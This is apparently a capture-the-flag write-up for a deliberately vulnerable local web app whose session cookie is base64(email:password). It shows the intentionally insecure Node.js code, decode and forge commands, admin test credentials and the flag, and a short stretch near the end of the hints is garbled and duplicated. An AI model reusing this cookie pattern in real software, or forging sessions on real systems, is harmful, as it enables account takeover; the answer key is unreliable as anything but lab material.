# 🍪 Session Cookie Manipulation Challenge

**Flag:** `CTF{b4s3_64_s3ss10n_f0rg3ry}`

## Challenge Overview

This challenge demonstrates an insecure session management vulnerability where session cookies are simply Base64-encoded credentials instead of cryptographically signed tokens. Players must decode, understand, and forge an admin session cookie to capture the flag.

## Vulnerability Details

### The Flaw
When users log in, the server sets a session cookie containing:
```
session = base64(username:password)
```

**Problems:**
- Base64 is **encoding**, not encryption
- Anyone can decode the cookie and see credentials
- Anyone can forge a new cookie with different credentials
- No cryptographic signing or verification
- Cookie is not httpOnly (accessible via JavaScript)

### Vulnerable Code

**Login endpoint** (`server.js` ~L370):
```javascript
// VULN: Set insecure session cookie (base64 encoded username:password)
const sessionData = `${email}:${password}`;
const sessionCookie = Buffer.from(sessionData).toString('base64');
res.cookie('session', sessionCookie, { 
    httpOnly: false, // VULN: Accessible via JavaScript
    maxAge: 24 * 60 * 60 * 1000
});
```

**Cookie authentication middleware** (`server.js` ~L242):
```javascript
function cookieAuth(req, res, next) {
    const sessionCookie = req.cookies.session;
    
    try {
        // VULN: Decode base64 session cookie (username:password)
        const decoded = Buffer.from(sessionCookie, 'base64').toString('utf-8');
        const [username, password] = decoded.split(':');
        
        const user = users.get(username);
        
        // VULN: Check password from cookie (very insecure!)
        if (user.password !== password) {
            return res.status(401).json({ ... });
        }
        
        req.user = { id: user.id, name: user.name, email: user.email, role: user.role };
        req.cookieUsername = username;
        next();
    } catch (error) {
        return res.status(401).json({ ... });
    }
}
```

## How to Solve It

### Step 1: Log in with Guest Account
Players can use the credentials provided on the login page:
- **Email:** `guest@vault.dev`
- **Password:** `guest123`

### Step 2: Inspect the Session Cookie
Open DevTools:
1. Press `F12` or right-click → Inspect
2. Go to **Application** tab (Chrome) or **Storage** tab (Firefox)
3. Navigate to **Cookies** → `http://localhost:3000`
4. Find the `session` cookie

Example value:
```
Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz
```

This looks like Base64!

### Step 3: Decode the Cookie
Players can use CyberChef, an online Base64 decoder, or command line:

**Bash/Linux:**
```bash
echo "Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz" | base64 -d
```

**PowerShell:**
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz"))
```

**JavaScript Console (DevTools):**
```javascript
atob("Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz")
```

**Output:**
```
guest@vault.dev:guest123
```

💡 **Aha!** The session cookie is just `email:password` in Base64.

### Step 4: Forge an Admin Token
Now that we know the format, we can create an admin session!

We need to find admin credentials. Trying common combinations:
- `admin@vault.dev:admin`
- `admin@vault.dev:password`
- `admin@vault.dev:admin123` ✓

**Encode admin credentials:**

**Bash:**
```bash
echo -n "admin@vault.dev:admin123" | base64
```

**PowerShell:**
```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("admin@vault.dev:admin123"))
```

**JavaScript Console:**
```javascript
btoa("admin@vault.dev:admin123")
```

**Output:**
```
YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz
```

### Step 5: Replace the Cookie
In DevTools:
1. Go to **Application** → **Cookies**
2. Double-click the `session` cookie value
3. Replace with: `YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz`
4. Press Enter to save

### Step 6: Get the Flag
Navigate to your **Profile** page or refresh if already there.

Click the **"Check for Flag 🚩"** button in the Security Challenge section.

The server will:
1. Decode your cookie: `admin@vault.dev:admin123`
2. Check credentials against the admin user
3. See you have `role: admin`
4. Return the flag!

**Flag obtained:**
```
CTF{b4s3_64_s3ss10n_f0rg3ry}
```

## Available Endpoints

### Primary Flag Endpoint
```http
GET /api/profile/flag
Cookie: session=YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz
```

**Response (as admin):**
```json
{
  "success": true,
  "flag": "CTF{b4s3_64_s3ss10n_f0rg3ry}",
  "message": "🎉 FLAG CAPTURED! You successfully exploited the insecure session cookie!",
  "user": {
    "id": "user_admin_cookie",
    "name": "Cookie Admin",
    "email": "admin@vault.dev",
    "role": "admin"
  },
  "sessionData": {
    "username": "admin",
    "role": "admin"
  }
}
```

### Alternative Flag Endpoint
```http
GET /api/flag/session
Cookie: session=YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz
```

**Response (as admin):**
```json
{
  "success": true,
  "flag": "CTF{b4s3_64_s3ss10n_f0rg3ry}",
  "message": "Congratulations! You've successfully forged an admin session cookie.",
  "user": { ... },
  "hint": "The session cookie was just base64(username:password). You decoded it and forged admin credentials!"
}
```

## Available Test Accounts

| Email | Password | Role |
|----------|----------|------|
| `guest@vault.dev` | `guest123` | guest |
| `admin@vault.dev` | `admin123` | admin |

## Real-World Impact

This vulnerability mirrors real security issues:

1. **LinkedIn 2012** - Used predictable session tokens allowing account takeover
2. **Many IoT devices** - Use Base64-encoded credentials in cookies/headers
3. **Legacy web apps** - Store `user_id` or `role` in unsigned cookies

### Why This is Dangerous
- **Session Hijacking** - Steal cookies, decode credentials, impersonate users
- **Privilege Escalation** - Forge admin/elevated role cookies
- **Credential Exposure** - Passwords visible in browser dev tools
- **No Audit Trail** - Forged sessions appear legitimate to server

### Proper Solutions
1. **Use cryptographically signed session tokens** (JWT with HMAC, or signed cookies)
2. **Store session data server-side** with random session IDs
3. **Set httpOnly cookies** to prevent JavaScript access
4. **Implement secure flag** for HTTPS-only cookies
5. **Add SameSite attribute** to prevent CSRF
6. **Never store passwords in cookies** in any form

## Learning Objectives

After completing this challenge, players should understand:
- ✅ Difference between encoding (Base64) and encryption
- ✅ How to inspect and manipulate browser cookies
- ✅ Dangers of client-side session management
- ✅ Importance of cryptographic signing for session tokens
- ✅ How to use browser DevTools for security testing
- ✅ Basics of privilege escalation via session forgery

## Hints for Players

If stuck, progressive hints:

1. 🔍 **Hint 1:** Check the cookies in your browser DevTools
2. 🔍 **Hint 2:** The session cookie looks like random characters, but it's a common encoding
3. 🔍 **Hint 3:** Try decoding the session cookie with Base64
4. 🔍 **Hint 4:** The cookie format is `username:password` - can you forge an admin one?
5. 🔍 **Hint 5:** Try encoding `admin:admin` as Base64 and replacing your cookie
email:password` - can you forge an admin one?
5. 🔍 **Hint 5:** Try encoding `admin@vault.dev:admin123

**Level:** Beginner to Intermediate

**Skills Required:**
- Basic understanding of HTTP cookies
- Browser DevTools usage
- Base64 encoding/decoding
- Basic authentication concepts

**Estimated Time:** 5-15 minutes

---

## Integration Notes

This challenge is seamlessly integrated into the main Vault application:
- ✅ No separate pages or complex setup needed
- ✅ Guest credentials shown on login page
- ✅ Flag checker built into Profile page
- ✅ Works alongside existing Bearer token authentication
- ✅ Server automatically sets cookie on any login
- ✅ Uses existing user database

Players can enjoy the challenge as part of the normal application flow!
